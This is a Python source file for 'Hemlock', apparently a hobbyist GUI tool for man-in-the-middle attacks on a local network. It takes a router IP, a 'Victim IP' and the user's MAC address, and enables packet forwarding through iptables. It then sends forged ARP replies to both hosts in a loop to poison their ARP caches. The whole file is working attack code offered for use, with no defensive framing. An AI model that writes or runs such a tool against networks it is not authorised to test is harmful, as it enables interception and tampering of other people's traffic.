#!/usr/bin/env python3
import customtkinter, subprocess, sys, re, time, os, threading
from CTkMessagebox import CTkMessagebox
import scapy.all as scapy

#def values_validate(router, victim):


def spoofing_switch_changed(state, routerip, victimip, timespoof, mac):
    router = routerip.get()
    victim = victimip.get()
    timespoof = int(timespoof.get())
    while state.get() == 1:
        try:
            state.configure(text="Spoofing ON 🟢")
            arp_packet = scapy.ARP(op=2, psrc=router, pdst=victim, hwsrc=mac)
            scapy.send(arp_packet, verbose=False)
            arp_packet = scapy.ARP(op=2, psrc=victim, pdst=router, hwsrc=mac)
            scapy.send(arp_packet, verbose=False)
            time.sleep(timespoof)
        except:
            break
    state.configure(text="Spoofing OFF 🔴")

def main():
    windows = customtkinter.CTk()
    windows.title("Hemlock")
    windows.geometry("400x400")
    windows.resizable(width=0,height=0)
    windows.withdraw()

    try:
        error_mac_message = ''
        while True:
            getmac = customtkinter.CTkInputDialog(text=f"Type your MAC address\n(FF:FF:FF:FF:FF:FF){error_mac_message}", title="Hemlock")
            mac = getmac.get_input()
            mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
            if mac_pattern.match(mac):
                break
            else:
                error_mac_message = "\n\nWrong MAC value"
    except:
        sys.exit(1)

    windows.grid_columnconfigure(0, weight=1)
    windows.grid_columnconfigure(1, weight=1)
    windows.grid_columnconfigure(2, weight=1)
    windows.grid_columnconfigure(3, weight=1)
    windows.grid_columnconfigure(4, weight=1)
    
    logo = customtkinter.CTkLabel(windows, text="Hemlock", font=customtkinter.CTkFont(size=20, weight="bold"), anchor="center")
    logo.grid(pady=20, row=0, column=0, columnspan=4, sticky="nsew")

    routerip = customtkinter.CTkLabel(windows, text="Router IP", font=customtkinter.CTkFont(size=15), anchor="center")
    routerip.grid(padx=5, pady=5, row=1, column=0, columnspan=2, sticky="ew")
    routerip_name = customtkinter.CTkEntry(windows, justify="center")
    routerip_name.grid(row=2, column=0, columnspan=2, padx=5, pady=5, sticky="ew")

    victimip = customtkinter.CTkLabel(windows, text="Victim IP", font=customtkinter.CTkFont(size=15), anchor="center")
    victimip.grid(padx=5, pady=5, row=1, column=2, columnspan=2, sticky="ew")
    victimip_name = customtkinter.CTkEntry(windows, justify="center")
    victimip_name.grid(row=2, column=2, columnspan=2, padx=5, pady=5, sticky="ew")

    timespoof_name = customtkinter.CTkLabel(windows, text="ARP Poisoning Interval (sec)", font=customtkinter.CTkFont(size=12), anchor="center")
    timespoof_name.grid(padx=10, pady=5, row=3, column=1, columnspan=2, sticky="ew")
    timespoof = customtkinter.CTkOptionMenu(windows, dynamic_resizing=False, values=["1", "3", "5", "10", "20", "30"], anchor="center")
    timespoof.grid(row=4, column=1, columnspan=2)

    state = customtkinter.CTkSwitch(windows, text="Spoofing OFF 🔴", font=customtkinter.CTkFont(size=10),
                                    command=lambda: threading.Thread(target=spoofing_switch_changed, args=(state, routerip_name, victimip_name, timespoof, mac), daemon=True).start())
    state.grid(row=5, column=1, columnspan=2, padx=20, pady=40)

    credit = customtkinter.CTkLabel(windows, text="v0.5 | by SergioBrvo01", font=customtkinter.CTkFont(size=10), fg_color=("gray85", "gray25"), corner_radius=5, padx=10)
    credit.grid(row=6, column=1, columnspan=2, padx=20, pady=40)

    windows.deiconify()
    windows.mainloop()

if __name__ == "__main__":
    try:
        user = os.getuid()
        if user == 0:
            subprocess.run(["iptables", "--policy", "FORWARD", "ACCEPT"])
            main()
        else:
            error_window = customtkinter.CTk()
            CTkMessagebox(title="Wrong User", message="You must be ROOT user", icon="cancel")
            error_window.after(3000, error_window.destroy)
            error_window.withdraw()
            error_window.mainloop()
            sys.exit(1)
    finally:
        if user == 0:
            subprocess.run(["iptables", "--policy", "FORWARD", "DROP"])


